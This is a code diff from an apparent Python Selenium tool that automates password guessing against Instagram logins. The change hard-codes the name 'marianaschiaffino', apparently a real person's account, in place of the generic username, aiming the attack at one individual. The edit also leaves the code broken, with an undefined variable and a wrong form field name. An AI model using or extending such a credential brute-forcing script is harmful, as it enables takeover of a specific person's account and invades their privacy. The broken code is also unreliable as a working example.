@@ -12,12 +12,13 @@ profile = webdriver.FirefoxProfile()
 profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
 driver = "reserved"
 
-def userExists(username):
+def userExists(marianaschiaffino):
 	try:
-		driver.get("https://instagram.com/"+username)
+		driver.get("https://instagram.com/"+marianaschiaffino)
 		assert (("Page Not Found" or "no encontrada") not in driver.title)
 	except AssertionError:
-		print 'user: "%s" does not exist, trying with the next!' %username
+		print 'user: "%s" does not exist, trying with the next!' %marianaschiaffino
+		
 		return 1
 	except:
 		'uknown error'
@@ -25,9 +26,9 @@ def userExists(username):
 def login(user, password, delay):
 	try:
 		print 'Trying with password: ' + password
-		elem = driver.find_element_by_name("username")
+		elem = driver.find_element_by_name("marianaschiaffino")
 		elem.clear()
-		elem.send_keys(user)
+		elem.send_keys(marianaschiaffino)
 		elem = driver.find_element_by_name("password")
 		elem.clear()
 		elem.send_keys(password)
